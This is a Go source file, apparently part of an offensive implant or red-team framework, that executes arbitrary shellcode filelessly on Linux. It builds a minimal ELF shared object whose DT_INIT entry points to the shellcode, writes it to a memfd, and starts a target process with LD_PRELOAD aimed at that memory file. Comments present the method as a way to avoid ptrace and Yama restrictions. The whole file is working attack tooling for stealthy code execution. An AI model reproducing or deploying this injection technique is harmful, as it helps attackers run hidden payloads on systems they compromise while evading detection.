//go:build linux

package commands

import (
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

// ldpreloadInject executes shellcode by building a minimal ELF .so with DT_INIT,
// writing it to a memfd (fileless), and spawning a target process with LD_PRELOAD.
// This avoids ptrace entirely and works under Yama ptrace_scope=1+.
// The shellcode runs as DT_INIT of the loaded .so — it must fork/thread if it
// wants the host process to continue normally.
func ldpreloadInject(shellcode []byte, target string) (string, error) {
	if target == "" {
		target = "/usr/bin/id"
	}

	so := buildInitSO(shellcode)

	fd, err := memfdCreate()
	if err != nil {
		return "", fmt.Errorf("memfd_create: %w", err)
	}
	f := os.NewFile(uintptr(fd), "memfd")
	defer f.Close()

	if _, err := f.Write(so); err != nil {
		return "", fmt.Errorf("write memfd: %w", err)
	}

	path := fmt.Sprintf("/proc/self/fd/%d", fd)

	parts := strings.Fields(target)
	cmd := exec.Command(parts[0], parts[1:]...)
	cmd.Env = append(os.Environ(), "LD_PRELOAD="+path)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("spawn %q: %w", target, err)
	}

	go func() { _ = cmd.Wait() }()

	return fmt.Sprintf("PID %d (%s), LD_PRELOAD=%s", cmd.Process.Pid, target, path), nil
}

func memfdCreate() (int, error) {
	name := [3]byte{'l', 'd', 0}
	fd, _, errno := syscall.Syscall(sysMemfdCreate, uintptr(unsafe.Pointer(&name[0])), 0, 0)
	if errno != 0 {
		return 0, errno
	}
	return int(fd), nil
}

// buildInitSO constructs a minimal ELF shared library where DT_INIT points to the
// shellcode. When the dynamic linker loads this .so via LD_PRELOAD, it calls the
// DT_INIT function before the host process's main().
func buildInitSO(shellcode []byte) []byte {
	const (
		ehdrSize = 64
		phdrSize = 56
		dynSize  = 16 // Elf64_Dyn entry size
		symSize  = 24 // Elf64_Sym entry size
	)

	// Layout:
	// 0x000: ELF header
	// 0x040: PT_LOAD program header
	// 0x078: PT_DYNAMIC program header
	// 0x0B0: Dynamic section (6 entries = 96 bytes)
	// 0x110: String table (1 byte)
	// 0x118: Symbol table (24 bytes, aligned)
	// 0x130: Shellcode

	const (
		dynOff   = 0x0B0
		strtabOff = 0x110
		symtabOff = 0x118
		codeOff   = 0x130
	)

	totalSize := codeOff + len(shellcode)
	buf := make([]byte, totalSize)

	// ELF header
	copy(buf[0:4], []byte{0x7f, 'E', 'L', 'F'})
	buf[4] = 2  // ELFCLASS64
	buf[5] = 1  // ELFDATA2LSB
	buf[6] = 1  // EV_CURRENT
	binary.LittleEndian.PutUint16(buf[16:], 3)     // e_type = ET_DYN
	binary.LittleEndian.PutUint16(buf[18:], elfMachine()) // e_machine
	binary.LittleEndian.PutUint32(buf[20:], 1)     // e_version
	binary.LittleEndian.PutUint64(buf[24:], 0)     // e_entry (unused)
	binary.LittleEndian.PutUint64(buf[32:], ehdrSize) // e_phoff
	binary.LittleEndian.PutUint64(buf[40:], 0)     // e_shoff (no sections)
	binary.LittleEndian.PutUint32(buf[48:], 0)     // e_flags
	binary.LittleEndian.PutUint16(buf[52:], ehdrSize) // e_ehsize
	binary.LittleEndian.PutUint16(buf[54:], phdrSize) // e_phentsize
	binary.LittleEndian.PutUint16(buf[56:], 2)     // e_phnum
	binary.LittleEndian.PutUint16(buf[58:], 64)    // e_shentsize
	binary.LittleEndian.PutUint16(buf[60:], 0)     // e_shnum
	binary.LittleEndian.PutUint16(buf[62:], 0)     // e_shstrndx

	// PT_LOAD: covers entire file, R|X
	off := ehdrSize
	binary.LittleEndian.PutUint32(buf[off:], 1)         // p_type = PT_LOAD
	binary.LittleEndian.PutUint32(buf[off+4:], 5)       // p_flags = PF_R|PF_X
	binary.LittleEndian.PutUint64(buf[off+8:], 0)       // p_offset
	binary.LittleEndian.PutUint64(buf[off+16:], 0)      // p_vaddr
	binary.LittleEndian.PutUint64(buf[off+24:], 0)      // p_paddr
	binary.LittleEndian.PutUint64(buf[off+32:], uint64(totalSize)) // p_filesz
	binary.LittleEndian.PutUint64(buf[off+40:], uint64(totalSize)) // p_memsz
	binary.LittleEndian.PutUint64(buf[off+48:], 0x1000) // p_align

	// PT_DYNAMIC: covers dynamic section
	off = ehdrSize + phdrSize
	binary.LittleEndian.PutUint32(buf[off:], 2)         // p_type = PT_DYNAMIC
	binary.LittleEndian.PutUint32(buf[off+4:], 6)       // p_flags = PF_R|PF_W
	binary.LittleEndian.PutUint64(buf[off+8:], dynOff)  // p_offset
	binary.LittleEndian.PutUint64(buf[off+16:], dynOff) // p_vaddr
	binary.LittleEndian.PutUint64(buf[off+24:], dynOff) // p_paddr
	binary.LittleEndian.PutUint64(buf[off+32:], 96)     // p_filesz (6 entries)
	binary.LittleEndian.PutUint64(buf[off+40:], 96)     // p_memsz
	binary.LittleEndian.PutUint64(buf[off+48:], 8)      // p_align

	// Dynamic section entries
	putDyn := func(offset int, tag, val uint64) {
		binary.LittleEndian.PutUint64(buf[offset:], tag)
		binary.LittleEndian.PutUint64(buf[offset+8:], val)
	}
	putDyn(dynOff+0*dynSize, 12, codeOff)     // DT_INIT = shellcode address
	putDyn(dynOff+1*dynSize, 5, strtabOff)    // DT_STRTAB
	putDyn(dynOff+2*dynSize, 6, symtabOff)    // DT_SYMTAB
	putDyn(dynOff+3*dynSize, 10, 1)           // DT_STRSZ = 1
	putDyn(dynOff+4*dynSize, 11, symSize)     // DT_SYMENT
	putDyn(dynOff+5*dynSize, 0, 0)            // DT_NULL

	// String table: single null byte (already zeroed)
	// Symbol table: single null entry (already zeroed)

	// Shellcode
	copy(buf[codeOff:], shellcode)

	return buf
}
